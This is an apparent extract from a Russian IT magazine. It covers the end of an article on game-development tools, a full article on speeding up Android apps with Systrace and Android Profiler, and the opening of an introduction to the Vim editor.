программа с откры тым исходным кодом Tiled. С его помощью можно соз‐
давать карты для двумер ных и изометрических игр. К ним можно отнести
плат формеры с видом сбоку/сверху, ролевые игры, стратегии. Тай лы могут
быть квадратными растрами или шестиугольниками. В качестве тайла можно
использовать любое изображение.
   Карты в Tiled формируются по слоям. Для опре деленных пли ток можно
задать свойства столкновения. Раз рабатываемые уров ни сохраняются в XML‐
формате TMX. Затем его можно заг рузить из движка игры. Формат TMX под‐
держивается рядом движ ков. Кроме XML‐подоб ного фор мата, поддержи‐
вается и JSON‐подоб ный.





                      Внеш ний вид Tiled


СОЗДАНИЕ КАРТ ТЕКСТУР
Создавать для каждого изображения отдельный файл — пло хое решение.
В игре могут использоваться десятки и сотни изображений, и загружать каж‐
дый в отдельнос ти непрактично и неудоб но, осо бен но если речь идет об ани‐
мации. Поэтому для нее обыч но используются таблицы спрай тов (Sprite
Sheet), каж дая из которых содержит боль шое чис ло изображений.
  Для создания спрайтовых таб лиц мож но взять программу TexturePacker.
При первом запуске тебе предложат выбор из бесплатной версии и Pro.
Отли чия Pro — в некоторых дополнительных возможнос тях вроде экспор та
в SWF, экспор та из командной стро ки и средств авто матизации. Бесплат ная
же версия содер жит только GUI‐версию интерфейса. Полная версия Texture‐
Packer под держивает фор маты загрузки спрайтовых таблиц для тридцати
движков (включая Unity 3D, Cocos2d‐x), а у бес плат ной версии этот список
огра ничен (срав нить списки ты можешь на сайте разработ чика).





                                TexturePacker

TexturePacker не толь ко создает компактную таб лицу спрай тов, но и сжимает
их и позволя ет оптимизи ровать цвет, что еще лучше экономит ресурсы. Пос‐
ле запуска бесплатной версии последует воп рос о том, для какого игрового
фрей мворка (или движ ка) создает ся дан ная таб лица спрайтов. Затем будет
предложено загрузить изоб ражения.


СОЗДАНИЕ АНИМАЦИИ
Ани миро ванные образы используются в играх постоянно. Чтобы создать ани‐
мацию какого‐либо объекта, можно нарисовать каждое его состояние самос‐
тоятельно в графическом редакторе от руки, но это будет очень долго и неп‐
родуктивно. Гораз до лучше воспользовать ся специальными инс трументами.
   Анимировать дву мерный объект можно, например, с помощью редактора
Flash, но мне гораздо больше нравится Spine ком пании Esoteric Software.
К сожалению, она не бесплатна, но такой мощ ный инструмент, как Spine, сто‐
ит своих денег (70 дол ларов за вер сию Essential или 300 дол ларов за профес‐
сиональ ную). Spine создает скелетную анимацию между свя занными гра‐
фичес кими изображени ями, а скелетная ани мация прекрасно под ходит
не только для персонажей, но и для движения и взаимодей ствия любых дру‐
гих объектов. Spine умеет экспортировать соз данную анимацию в различные
форматы, как в видео, так и по кад рам.





                        А я купил Spine

Прежде чем при обрести этот инс тру мент, мож но опро бовать триальную вер‐
сию. От полной она отличается тем, что сохранить проект и экспортировать
данные нельзя.
  В Spine изображения прик репля ются к кос тям, а затем пос ледние ани‐
мируются. Какую выгоду мы приобре таем, исполь зуя скелетную анимацию
вместо покадровой?
 • Меньший размер итоговых данных благодаря использованию меньшего
   количества изоб ражений, только сохранение коор динат кос тей;
 • со ответственно, меньше приходится рисовать;
 • благодаря интерполяции анимация работа ет более быстро и плавно;
 • ске летные ани мации могут сме шиваться;
 • анимацией можно управлять из кода.

Еще одна очень полез ная прог рамма для соз дания спрай товых ани маций —
Spriter. Она в целом похожа на Spine и выполняет те же функции. У Spriter есть
демонстрационная и про фессиональная версии.





                                        Spriter


ЗВУКОВОЕ СОПРОВОЖДЕНИЕ
У звукоинженера в игровой индустрии весьма творческая работа. Он раз‐
ными спо собами пытается получить необ ходимые ему звуки: хлопает воз‐
душные шары, взры вает петарды, переливает воду из одно го стакана в дру‐
гой, записывает звук дождя, находясь на крыше здания, — а потом все эти
звуки обрабатывает в звуковом редакторе. Или же соз дает их с нуля. На рын‐
ке пред став лено большое количество ком мерчес ких редакторов. Также
немало их и в свободном дос тупе. Наиболее популяр ный из них — это Audaci‐
ty, и его сла ва вполне оправданна.
   Этот редак тор обладает всеми возможностями коммерческих редак торов
аудио:
 • од новре менная работа с нес колькими дорож ками, в том числе прос‐
   лушивание;
 • работа с файлами раз ных форматов — чтение и запись MP3, WAV, OGG
   и так далее;
 • удаление шумов из звука;
 • из менение темпа и высоты звука;
 • большой набор эффектов, как пос тавляемых с программой «из коробки»,
   так и устанавливаемых отдельно — в виде плагинов.





                                  Audacity


РЕСУРСЫ БЕСПЛАТНО!
Не обхо димые  эле менты  арта мож но  найти  на  просторах  интернета.
На некоторых сайтах энтузиас ты вык ладыва ют свои труды, чтобы ими мог вос‐
поль зоваться любой желающий. Тем самым худож ники, моделе ры и музыкан‐
ты рассказывают о себе и создают свое портфо лио. Если игра с их ресур‐
сами станет популяр ной, то это боль шой повод для гор дости — можно смело
рас сказывать об этом на собеседовании. Такие работы ты можешь найти,
к при меру, на сай те OpenGameArt.
  Еще один источник арта — это магазины ассе тов, которые пред лагают
вендоры движков. У всех мало‐мальски раскрученных движков есть свои сто‐
ры. У Unity просто огромный магазин ассетов, в нем продается все, что душе
игродела угодно: отдельные модельки, паки текстур, наборы ани мации,
целые сце ны и исходники законченных проектов, начиненные объ ектами,
сюжетные линии, инструменты в помощь гей ммей керу, сер висы для создания
онлайновых и других игр, расширения, аудио‐ и визуаль ные эффекты. Многие
товары отдаются даром. Примерно такая же исто рия с Unreal Engine Market‐
place. У CryEngine есть свой Marketplace, в котором продается тот же набор
товаров, но выбор замет но беднее.




По дыто жим наши выводы в одной большой схеме.





                    Схема проектирования игры





ЗАКЛЮЧЕНИЕ
Надеюсь, статья была тебе интересна и ты узнал что‐то новое об инс трумен‐
тах игро дела. Я не пытался  охватить все инс тру менты или выделить
какую‐либо часть из них. Существует великое множество тулз для создания
игр. Я лишь остановился на том ком плекте, который использую в сво их про‐
ектах чаще все го.
   Разрабаты вая некото рые игры, порой удоб нее запилить тулзу самос‐
тоятельно и специально для одной игры. Час то в дальнейшей раз работ ке
это эко номит кучу времени при создании уров ней, мини‐игр или каких‐то осо‐
бых механик.
   Если ты тоже не чужд гей мдеву, не забудь поделиться в комментариях сво‐
ими любимы ми инструментами!
 КОДИНГ





   Евгений Зобнин
Редактор Unixoid и Mobile
      zobnin@glc.ru





 ИЗБАВЛЯЕМ СВОЕ ПРИЛОЖЕНИЕ
 ОТ ЛАГОВ, ТОРМОЗОВ И ДОЛГИХ
 ЭКРАНОВ ЗАГРУЗКИ




 Про изводитель ность —  один  из  ключевых  параметров
 мобильного приложе ния. Твое детище может быть сколь
 угодно функциональным, кра сивым и полезным, но если оно
 тормозит — про вал практически гарантирован. К счастью,
 мно гих проблем можно избе жать, следуя простым правилам
 и пользуясь подходящими инс трументами.


 КАК ПОЯВЛЯЮТСЯ ЛАГИ
 Пе ред тем как перей ти к обсуждению инстру ментов и техник повыше ния про‐
 изводительности, уде лим немного времени тому, как вообще появляются
 лаги и почему приложе ние может быть медленным. Основные проблемы сов‐
 ременных при ложе ний:
  • слишком долгая заг рузка при ложе ния и отдельных экранов;
  • фри зы, когда приложение просто зависает, а через некоторое вре мя
    появ ляется сообщение с предложением его убить;
  • проседания FPS, когда вместо плавной прок рутки и анимации поль‐
    зователь видит слайд‐шоу.

 При чины всех этих проблем просты: слиш ком долгое выпол нение каких‐либо
 операций, вычислительных или операций ввода‐вывода, а вот способы опти‐
 миза ции разные.


 ХОЛОДНЫЙ СТАРТ
 Запуск приложе ния сос тоит из нес кольких стадий: это инициали зация нового
 про цесса, подготов ка окна для вывода интерфейса при ложе ния, показ окна
 на экране и передача управления коду приложения. Далее при ложе ние дол‐
 жно сфор мировать интерфейс на основе опи сания в XML‐фай ле, под грузить
 с «диска» или из интернета необходимые для корректного отображения
 интерфейса эле менты (бит мапы, данные для списков, графиков и прочее),
 инициализировать дополнительные элементы интерфейса, такие как выд‐
 вижное меню (Drawer), повесить на элементы интерфейса колбэки.
    Оче видно, что это огромный объем работы и следует приложить все уси‐
 лия для того, чтобы выполнить ее как мож но быстрее. Два главных инструмен‐
 та в этом деле:
  • от ложенная ини циали зация;
  • параллельный запуск задач.

 Отложен ная инициализация означает, что все, что мож но выполнить поз же,
 надо выполнить поз же. Не стоит соз давать и инициализировать все данные
 и объ екты, которые только могут понадо биться при ложе нию, в самом начале.
 Сна чала ини циали зируем только то, что нужно для корректного отображения
 глав ного экрана, затем переходим ко все му осталь ному.
   Обработку сложных и дорогостоящих операций, которые невозможно
 оптимизи ровать, а  также блокируемых операций  типа  чтения с дис ка
 или получе ния данных с сервера, следует отправлять в отдельный поток
 и обновлять интерфейс асинхронно по завершении его работы.
    Пример: у тебя есть приложение, которое дол жно показывать на главном
 экране свод ку данных, полученных из интернета. Самый оче видный способ
 сде лать это — получить данные с сервера и после этого отобразить
 интерфейс. И хотя Android по умолчанию не позволя ет выполнять сетевые
 запросы в основном потоке приложения, вынуж дая соз давать отдельный
 поток для получения данных с сервера, боль шинство разработчиков все рав‐
 но пос тараются сде лать код последовательным.
    Проблема такого под хода в том, что он вносит задержки, которые просто
 не нужны. Большую часть времени сетевой поток будет простаивать в ожи‐
 дании данных, и это время лучше использовать для отображения интерфейса.
 Другими словами: сразу после запус ка при ложения следует создать поток,
 который будет получать данные с сервера, но не ожидать получе ния этих дан‐
 ных, а создавать интерфейс, используя времен ные заглушки вмес то пока
 еще не принятых данных.
   В качестве заглушек можно использовать пустые картинки, пустые стро ки,
 пустые списки (например, RecyclerView можно инициализировать сразу, а при
 получе нии данных просто вызвать notifyDataSetChanged()). После получе‐
 ния данных с сер вера их следует кешировать. При следующем запуске их
 можно будет исполь зовать вместо заглушек.
    Та кой под ход эффективно работает в отношении не только сетевых ком‐
 муникаций, но и любых задач, требующих дол гих вычислений и/или ожидания
 данных. Например, лаунчеру необ ходимо немало времени, чтобы запросить
  у системы список установленных при ложе ний, отсортировать его, загрузить
 в память икон ки и другие данные. Поэто му современные лаунчеры дела ют
 это асинхронно: отображают интерфейс и с помощью фонового потока
 запол няют его иконками при ложений.
   Еще одно узкое место: формирование интерфей са из опи сания лайотов
 в XML‐файле. Когда ты вызываешь метод setContentView() или inflate()
 объ екта LayoutInﬂater (в коде фраг мента), Android находит нужный лай от
 в бинарном XML‐файле (для эффективности Android Studio упаковы вает XML
 в бинарный формат), читает его, проводит пар синг и на основе полученных
 данных формирует интерфейс, измеряя и подгоняя элементы интерфейса
 друг к другу.
    Это дей ствитель но сложная и дорогая опе рация. Поэтому необходимо
 уделить особое вни мание опти мизации лай отов: избе гать излишней вложен‐
 ности лай отов друг в дру га (нап ример, исполь зовать RelativeLayout вмес то
 вло женных друг в друга LinearLayout), а также раз бить сложные описания
 интерфейса на множес тво более мелких и загружать их толь ко тог да, когда
 в этом воз никнет необходимость.
    Другой вариант — перейти на язык Kotlin и исполь зовать библиотеку Anko.
 Она позволя ет описывать интерфейс пря мо в коде, благода ря чему скорость
 отображения интерфейса возраста ет в четыре раза, а ты получа ешь большую
 гибкость в управле нии логикой формирования интерфей са.


 ФРИЗЫ И ПРОСЕДАНИЯ FPS
 В Android только глав ный поток приложе ния имеет право обновлять экран
 и обрабаты вать нажатия на экран. Это зна чит, что, когда твое при ложе ние
 занимается слож ной работой в главном потоке, оно не име ет возможности
 реагировать на нажатия. Для пользовате ля приложение будет выг лядеть
 зависшим. В данном случае опять же поможет вынос сложных операций
 в отдель ные потоки.
     Есть, однако, намного более тонкий и неоче видный момент. Android
 обновля ет экран со скоростью 60 FPS. Это значит, что во вре мя показа ани‐
 мации или промот ки списков у него есть всего 16,6 мс на отображение каж‐
 дого кадра. В боль шинс тве случаев Android справляется с этой работой и не
 теряет кадров. Но некор рек тно написан ное приложение может затормозить
  его.





                           Упс, мы пропус тили кадр

 Прос той при мер: RecyclerView — элемент интерфейса, поз воляющий соз‐
 давать чрезвычайно длинные проматываемые списки, которые занима ют
 оди наковое количество памяти вне зависимости от длины самого списка.
 Такое воз можно благодаря переиспользованию одних и тех же наборов эле‐
 ментов интерфей са (ViewHolder) для отоб ражения разных элементов спис ка.
 Когда эле мент списка скрывает ся с экрана, его ViewHolder переме щается
 в кеш и затем использует ся для отображения сле дующих эле ментов списка.
    Когда RecyclerView извлекает ViewHolder из кеша, он запускает метод on‐
 BindViewHolder() тво его адаптера, что бы наполнить его данными конкрет‐
 ного эле мента списка. И тут происходит интерес ное: если метод onBind‐
 ViewHolder() будет делать слишком много работы, RecyclerView не успе ет
 вовремя сформировать следующий элемент для отображения и список нач‐
 нет тор мозить во время промот ки.
   Еще один пример. К RecyclerView можно подключить кас томный Recy‐
 clerView.OnScrollListener(), метод OnScrolled() которого будет выз ван
 при промотке спис ка. Обычно его используют для динамичес кого скрытия
 и показа круглой action‐кнопки в углу экра на (FAB — Floating Action Button).
 Но если реализовать в этом методе более сложный код, спи сок опять же
 будет притормаживать.
    Ну и третий при мер. Допустим, интерфейс твоего при ложе ния состоит
 из  множества  фраг ментов,  между  которы ми  можно  переключать ся
 с помощью бокового меню (Drawer). Кажется, что самый оче видный вари ант
 решения этой задачи — поместить в обра бот чик нажатия на пункты меню
 при мерно такой код:


 // Переключаем фрагмент
 getSupportFragmentManager
         .beginTransaction()
         .replace(R.id.container, fragment, "fragment")
         .commit()
 // Закрываем Drawer
 drawer.closeDrawer(GravityCompat.START)

 Все логично, вот толь ко если ты запустишь приложение и протес тируешь его,
 то увидишь, что анимация закрытия меню тормозит. Проблема кро ется в том,
 что метод commit() асинхронный, то есть перек лючение между фрагментами
 и закрытие меню будут про исходить одновре менно и смартфон просто
 не успе ет вовремя обработать все операции обновления экра на.
    Чтобы избе жать это го, переключать фраг мент нужно уже после того,
 как анимация зак рытия меню закончилась. Сде лать это можно, подклю чив
  к меню кастомный DrawerListener:


 mDrawerLayout.addDrawerListener(new DrawerLayout.DrawerListener() {
     @Override public void onDrawerSlide(View drawerView, float slideO
 ffset) {}
     @Override public void onDrawerOpened(View drawerView) {}
     @Override public void onDrawerStateChanged(int newState) {}
     @Override
     public void onDrawerClosed(View drawerView) {
       if (mFragmentToSet != null) {
         getSupportFragmentManager()
               .beginTransaction()
               .replace(R.id.container, mFragmentToSet)
               .commit();
         mFragmentToSet = null;
       }
     }
 });

 Еще один совсем не очевидный момент. Начиная с Android 3.0 рендеринг
 интерфейса приложений происхо дит на графическом процессоре. Это зна‐
  чит, что все битмапы, drawable и ресурсы, ука занные в теме при ложе ния, выг‐
 ружаются в память GPU и поэто му доступ к ним про исходит очень быстро.
   Лю бой эле мент интерфейса,  показанный на  экране, преобразуется
 в набор полигонов и GPU‐инс трукций и поэто му отображается в слу чае, нап‐
 ример, про мотки быстро. Так же быстро будет скрываться и показываться
 View с помощью изменения атрибута visibility (button.setVisibility(View.GONE)
 и button.setVisibility(View.VISIBLE)).
    А вот при изменении View, даже самом минимальном, системе вновь при‐
 дет ся пересоз дать View с нуля, заг ружая в GPU новые полигоны и инструкции.
 Более того, при изме нении TextView эта опе рация ста нет еще более дорогой,
  так как Android при дется сна чала про извести растеризацию шриф та, то есть
 прев ратить текст в набор пря моугольных картинок, затем сделать все замеры
 и сформировать инструкции для GPU. А еще есть операция перес чета
 положения текуще го элемента и других элементов лайота. Все это необ‐
 ходимо учитывать и изме нять View только тогда, ког да это действитель но нуж‐
  но.
    Overdraw — еще одна серьезная проблема. Как мы говорили выше, раз‐
 бор слож ных лай отов с множеством вло жен ных элементов будет медленным
 сам по себе, но также он наверняка принесет с собой проблему частой
 перерисовки экрана.
    Представь, что у тебя есть нес колько вло женных друг в дру га LinearLayout
 и некоторые из них к тому же со свойством background, то есть они не только
 вмещают в себя другие элемен ты интерфейса, но и имеют фон в виде рисун‐
 ка или залив ки цве том. В результате на этапе рендеринга интерфейса GPU
 будет делать так: заполнит пик селями нужного цвета область, занимаемую
 корневым LinearLayout, затем заполнит часть экрана, занимаемую вложенным
 лайотом, другим цветом (или тем же) и так далее. В результате во время рен‐
 деринга одно го кадра многие пиксели на экране будут обновле ны нес колько
  раз. А это не име ет никакого смысла.
    Полностью избе жать overdraw невоз можно. Нап ример, если необходимо
 отобразить кнопку на красном фоне, тебе все равно придется сна чала залить
 экран красным, а затем повторно изменить пиксели, отображающие кноп ку.
 К тому же Android уме ет опти мизировать рендеринг так, чтобы overdraw
 не про исходил (нап ример, если два элемен та одинакового размера находят‐
 ся друг над другом и второй непрозрачен, первый прос то не будет отри‐
  сован). Однако многое зависит от прог раммис та, который должен всеми
 силами стараться минимизировать overdraw.
   Поможет в этом инструмент отладки наложе ний. Он встро ен в Android
 и находится здесь: Settings → Developer Options → Debug GPU overdraw →
 Show overdraw areas. Пос ле его включения экран перек расится в раз ные цве‐
  та, которые означают следующее:
  • обыч ный цвет — оди нарное наложение;
  • си ний — двойное наложение;
  • зе леный — тройное;
  • красный — четверное и больше.

 Правило здесь прос тое: если большая часть интерфейса твоего при ложе ния
 ста ла зеленой или красной — у тебя проблемы. Если же ты видишь пре иму‐
 щественно синий (или родной цвет приложе ния) с небольшими вкраплени‐
 ями зеленого и красного там, где отображаются разные переключатели
 или другие динамичес кие элементы интерфей са, — все нормально.





           Overdraw здорового приложения и overdraw курильщика

 Ну и несколь ко советов:
  • Постарайся не использовать свойство background в лайотах.
  • Сок рати количество вло жен ных лайотов.
  • Вставь в начало кода  Activity такую строку: getWindow().setBack
    groundDrawable(null); .
  • Не используй проз рачность там, где можно обой тись без нее.
  • Используй инструмент Hierarchy Viewer для ана лиза иерар хии своих лай‐
     отов, их отно шений друг к дру гу, оцен ки скорос ти рендеринга и рас чета
    размеров.


 SYSTRACE
 Най ти узкие места в относительно простом приложе нии, которое ты написал
 за несколь ко дней, несложно. Достаточно следовать описанным выше пра‐
 вилам. Но когда речь заходит о действительно большом проекте, без спе‐
 циальных инструментов не обой тись.
     Systrace — один из важ ней ших инструмен тов, которые ты должен освоить.
 Это  трассировщик,  который  позволяет  прос ледить,  что  происходит
 на устрой стве во время работы при ложе ния. В частности, он наглядно
 покажет, как происходит отри совка каж дого кадра, какие кадры были отри‐
 сованы вовремя, а какие системе пришлось выб росить.
     Systrace можно запустить с помощью Android Device Monitor, который,
 в свою оче редь, находит ся в меню Tools → Android в Android Studio. Откры‐
 ваем Android Device Monitor, дожидаемся, пока он обнаружит смартфон,
 выбираем при ложе ние и нажимаем кноп ку запуска трассировки.





 В открыв шемся окне запус ка оставляем все нас тройки как есть и нажимаем
 Ok. Трассировка про должится пять секунд, после чего будет сформирован
 HTML‐файл с данными (в *nix это файл trace.html в домашнем каталоге). Его
 следует открыть в бра узере.





                       Отчет о трас сировке

 При пер вом взгляде отчет Systrace вводит в замеша тель ство — огромное
 количество непонят но что значащих дан ных. К счастью, большая часть этих
 данных тебе не понадобит ся, тебя интересуют толь ко строки Frames, UI
 Thread и RenderThread.
    Frames показывает обновле ния экра на. Каж дый кадр — это кружок одного
 из трех цве тов: зеленый, желтый, красный. Зеленый означает, что кадр был
 отрисован за 16,6 мс, желтый и красный — отри совка кад ра заняла боль‐
 ше 16,6 мс, то есть фреймрейт падает. Сразу под строкой Frames находится
 строка UI Thread, с помощью которой можно про анализировать, какие шаги
 выполнила система для отображения фрейма.
    Клик нув по кругу, ты получишь дополнительную информацию о том, почему
 система пот ратила на отри совку фрейма больше вре мени, чем положено.
 Возможные ситуации и методы их решения описаны в до кументации раз‐
 работ чика. Добавлю только, что не сто ит обра щать внимания на проб лему
 Sheduling delay. Обычно она выз вана вовсе не тво им приложе нием, а самим
  Android. Особенно часто она появляется на ста рых и маломощ ных смар тфо‐
  нах.
     Systrace позволя ет оценить, на каком этапе про изошла задер жка отрисов‐
  ки. Но он не ска жет тебе, была ли проблема вызвана твоим кодом, и если да,
 то где кон кретно узкое место. Что бы найти проблему, вывод Systrace можно
 детализировать, добавив в код приложе ния маркеры, которые позволят оце‐
  нить, сколь ко времени занимает выполнение твоего собственного кода. При‐
 мер трассировки метода onBindViewHolder:


 @Override
 public void onBindViewHolder(MyViewHolder holder, int position) {
     Trace.beginSection("MyAdapter.onBindViewHolder");
     try {
         try {
             Trace.beginSection("MyAdapter.queryDatabase");
             RowItem rowItem = queryDatabase(position);
             mDataset.add(rowItem);
         } finally {
             Trace.endSection();
         }
         holder.bind(mDataset.get(position));
     } finally {
         Trace.endSection();
     }
 }

 Есть более простой инс тру мент трас сировки, встро енный в Android. Просто
 включи опцию Developer options → Proﬁle GPU rendering → On screen as bars,
 и на экране появится график. По оси X — кадры, по оси Y — стол бцы, отоб‐
 ражающие дли тельность отри совки каж дого кадра. Если столбец выше
 зеленой черты — на отри сов ку кад ра ушло боль ше 16,6 мс.


 ANDROID PROFILER
 Это еще один важный инстру мент трас сировки, поз воля ющий оценить, сколь‐
 ко вре мени понадо билось для завер шения работы того или ино го метода
 в твоем приложе нии. Так же как и Systrace, он формирует отчет за опре делен‐
 ный промежуток вре мени, но отчет этот гораздо более низ коуровневый
 и касается каждого отдельно взя того метода, который был вызван.
    Запускаем Android Studio, кликаем на Android Proﬁler вни зу экрана, затем
 на CPU и нажимаем красную круг лую кнопку записи вверху экрана, останав‐
 ливаем запись, ког да нужно. Вни зу экрана появит ся окно с отчетом.





                        CPU Proﬁler

 По умол чанию отчет выводится в виде диаграммы, где по оси X отображается
 вре мя, а по оси Y — вызываемые методы. Оран жевым помечены сис темные
 методы (API), зеленым — методы самого приложения, голубым — методы
 сторонних API, включая Java. На вкладке Flame chart — похожая диаграмма,
 в которой одинаковые методы объеди нены. Она удоб на тем, что позволяет
 наг лядно оценить, сколь ко всего вре мени работал тот или иной метод за весь
 период трей синга.
    Вкладки Top Down и Bottom Up показывают дерево вызовов методов,
 включая информацию о затрачен ном на их выполнение времени:
  • Self — время исполнения кода самого метода;
  • Children — время исполнения кода всех вызванных им методов;
  • Total — сумма Self и Children.

 Как и Systrace, этот инс тру мент требует вдум чивого изучения отчета. Он
 не подскажет тебе, где и что пош ло не так. Он прос то рассказыва ет, когда
 и что происхо дило в твоем приложении, и позволяет найти участки кода,
 на которые пришлось боль ше всего процес сорно го времени.


 ВЫВОДЫ
 Я описал лишь малую часть того, на что стоит обратить внимание при раз‐
 работ ке производительного приложе ния. Сущес твует огромное количес тво
 раз личных ситуаций и проб лем, с которыми ты стол кнешься. Никакая статья
 или кни га не научит тебя, как с ними справляться, помогут толь ко опыт
 и понимание принципов работы Android.
UNIXOID





КАК ПЕРЕСТАТЬ
БОЯТЬСЯ VIM
И НАЧАТЬ ЕГО
ИСПОЛЬЗОВАТЬ





     Евгений Зобнин                                                              Илья Русанен
  Редактор Unixoid и Mobile                                                                 Главный редактор ][,
        zobnin@glc.ru                                                                  занимаюсь разработкой и
                                                                                            безопасностью
                                                                                                    rusanen@glc.ru



Vim — один из самых про тиво речивых инструментов из всех
видев ших свет. Это не прос то редак тор, это лак мусовая
бумаж ка, чет ко разделяющая прог раммис тов, администра‐
торов и юниксоидов на своих и чужих. Пока одни задаются
вопросом, зачем нуж на эта мертвечина в XXI веке, другие
не могут представить себе жизни без Vim. Но чем же он их
прив лекает? Почему у редак тора, который появился на свет
более сорока лет назад, столь ко фанатов в сегодняшнем
мире? Попробуем разобрать ся.


САМЫЙ СТРАННЫЙ РЕДАКТОР
На первый взгляд Vim выг лядит очень и очень странно. Знакомство с ним соп‐
ровождается страшными мучениями, когда ты просто не можешь понять, что
про исхо дит. Редактор либо вообще не реаги рует на нажатия клавиш, либо
ведет себя крайне неадек ватно. Ты пишешь слово door, а вместо этого Vim
переходит на новую стро ку и вставляет or. Ты стираешь эту галиматью и снова
про буешь что‐то написать — и, о чудо, на экране дей ствительно появляется
текст.
  А потом его опять начинает глючить.
   Спустя несколь ко попыток разоб раться, как это работа ет, и бес численное
множество матерных слов ты идешь в интернет и узнаешь, что Vim — двух‐
режимный редактор. Писать текст здесь можно только в режиме ввода (IN‐
SERT), для перехода в который сле дует нажать кноп ку i или Insert.
  Основной же режим, для выхода в который используется Esc, здесь пред‐
назна чен для ввода, как тебе на первый взгляд кажется, хоткеев. Причем сос‐
тоять они могут все го из одной клавиши: w — передвигает кур сор к сле‐
дующе му сло ву, 0 — в начало стро ки, $ — в конец строки, A переводит кур‐
сор в конец стро ки и перек люча ет редактор в режим ввода, u — аналог Ctrl‐Z
в нормальных редакторах.
  Погуглив еще немного, ты обнаружи ваешь, что есть также «хоткеи» из двух
и более пос ледовательных нажатий. Такие, как, нап ример, dd, который уда‐
ляет всю строку, и dw, удаляющий слово, gg и GG , которые переме щают кур‐
сор в начало и конец документа.
  Нем ного при вык нув, ты уже можешь кое‐как пры гать между режимами
и вво дить эти стран ные хоткеи — они даже начинают казать ся тебе удобными,
но один вопрос все‐таки тебя не покида ет:
 — Зачем здесь эти режимы?!
   «Хот кеи» Vim дей ствительно удобны благодаря сво ей лаконич ности,
но разве необходимость переключаться меж ду режимами не убивает все их
удобство? Разве не проще нажимать пусть и тре бующие больше движений
горячие клавиши в нор мальных редакторах, чем мотаться взад‐вперед между
режимами? Да, может быть, сорок лет назад, ког да на клавиату рах не было
Ctrl и Alt, это и было оправданно, но сейчас‐то зачем?
   Так и закан чива ет зна комство с Vim среднестатистический поль зователь.
Некоторое время он, конечно, еще потратит на то, чтобы най ти выход,
но затем забудет, как страшный сон, и вернется к своему любимо му Sublime.
А уж в условиях сурового сервера и nano сойдет.
  Почему так происхо дит? По одной простой при чине: для работы с Vim нуж‐
на совсем другая система мышления, переключиться на которую мало кому
удается сразу.





  23 мая 2017 года вопрос «Как вый ти из Vim?» набрал один миллион
  просмотров на Stack Overﬂow


ФИЛОСОФИЯ VIM
Что бы понять, почему Vim именно такой, какой есть, и чтобы научиться
использовать его эффектив но, необ ходимо запом нить две простые исти ны.
  Ис тина первая. Разделение режимов Vim име ет абсолютно логичный
утилитарный характер. В одном режиме ты пишешь текст, во втором редак‐
тируешь. В современных редакторах эти гра ницы размыты, мы привыкли
писать и тут же редак тировать, стирать, снова писать. В режиме ввода Vim
позволя ет это делать, но в очень огра ниченных пределах: написал не ту бук‐
ву — стер, написал другую. Все остальное — в режиме редактирования
(основной режим).
  Ис тина вто рая. «Хот кеи», доступные в режиме редактирования, —
это вовсе не хоткеи, а мощная система команд с аргументами, циклами
и регистрами. При исполь зовании Vim ты ни в коем случае не дол жен мыслить
стандартным обра зом: сейчас я тыкну мыш кой на том сло ве, потом нажму
Backspace столь ко раз, сколько потребуется, что бы его стереть, напишу дру‐
гое сло во, а потом перемещу курсор обратно. Вместо этого ты дол жен отдать
редак тору команду: замени вон то слово на это и верни меня обратно.
   Чтобы проиллюстри ровать этот принцип, взглянем на простой при мер.
Допустим, ты просматриваешь только что написанный текст и решаешь, что
в абзаце, на котором в данный момент рас положен кур сор, пос леднее пред‐
ложение лиш нее и его следует уда лить.
  Первая идея, которая придет тебе в голову, — взять мышку, выделить пос‐
леднее предложение, выб рать в меню «Вырезать» или нажать Del. Зву чит
прос то и логично, но что ты скажешь про это?


}d(

Нажатие этих трех кнопок сделает то же самое. Я очень удивлюсь, если на это
у тебя уйдет боль ше пары секунд.
   Что они значат? Давай раз беремся:
 • } — команда перемещения, переб расывает курсор в конец абзаца;
 • d — команда изме нения, а имен но удаления (d — delete);
 • ( — коман да перемещения, переб расывает курсор в начало пре дыду щего
   пред ложения.

Так как коман ды перемещения могут быть аргументами команд изме нения,
вся команда на человеческом языке звучит так: } — переместить курсор
в конец абзаца, а затем d( — удалить все символы до начала пре дыду щего
предложения. А если сов сем просто: уда лить последнее пред ложение
текуще го абзаца.
  Команды можно повторять, нап ример: 3} — переместить курсор на три
абзаца вперед, }d2( — удалить два пос ледних предложения в абзаце, 3J —
объ еди нить следующие три строки в абзац (J — Join), 3w — перейти на три
слова вперед (w — word), 50G — перейти к пятидесятой строке (G — Go).





  У Vim хорошая докумен тация, прос то набери :help и сле дуй инструкциям

Другой пример: ты опять же просматриваешь готовый текст и замеча ешь сло‐
во Windows, которое лучше заменить на Linux. Решение в лоб — пос тавить
курсор перед ним, нажать клавишу Del нуж ное количество  раз, затем
написать другое. Решение в затылок — переместить курсор на слово, нажать
извращенную трех пальцевую комбинацию замены слова и написать дру гое.
Правильное решение:


/Win<Enter>cwLinux

 • /Win — команда перемещения с помощью поиска (в данном случае ищем
   Win);
 • cw — коман да замены (c — change) с аргу ментом «сло во» (w — word);
 • Linux — новое слово.

Что бы прос то удалить сло во, можно использовать такую команду: /Windw
(dw — delete word). Обрати внимание: в отличие от «поиска и замены» тебе
не обязательно писать сло во целиком. Более того, ты можешь сде лать то же
самое другими методами. Нап ример, если слово Windows вто рое в третьем
предложении, заменить его мож но так: {3)wcwLinux.
   Те перь о том, как редак тировать код. Представь, что ты пишешь или прос‐
матри ваешь свой код и замечаешь, что метод текуще го класса, вызов которо‐
го находится под курсором, использует ся толь ко здесь и поэто му его лучше
сде лать при ватным. То есть тебе надо перейти к дек ларации метода и вста‐
вить перед ним сло во‐модификатор private.
  Нуб в этой ситуации будет действовать пря молинейно: промотает код,
най дет в нем нужный метод, тык нет мышкой, вста вит private перед именем
метода, а потом промота ет обратно. Более продвинутый раз работчик
использует хоткей для быстрого перехода к декларации метода, он может
даже использовать дру гой хоткей, чтобы быс тро сде лать метод приватным,
а самый прод винутый еще и воспользует ся хот кеем для возврата.
   Пользователь Vim сделает так:


gdiprivate <Esc>``

 • gd — перехо дим к определению фун кции или метода (gd — go deﬁnition);
 •  i — переключаемся в режим ввода;
 • private — сло во‐модификатор и пробел;
 • Esc — воз вращаем ся в обычный режим;
 •  `` — прыгаем туда, где были до перехода (воз вращаем курсор обратно).

Ты можешь сказать, что здесь у Vim нет никаких преимуществ по сравнению
с хорошими средами раз работки, но обра ти вни мание на два момента. Пер‐
вый: это очень заезженный пример, и именно поэтому он легко решается
с помощью сов ременных средств раз работки. Возь ми ситуацию поэкзотич‐
нее, и среда разработ ки окажется бессильна, а Vim позволит решить задачу
быстро и эффективно.
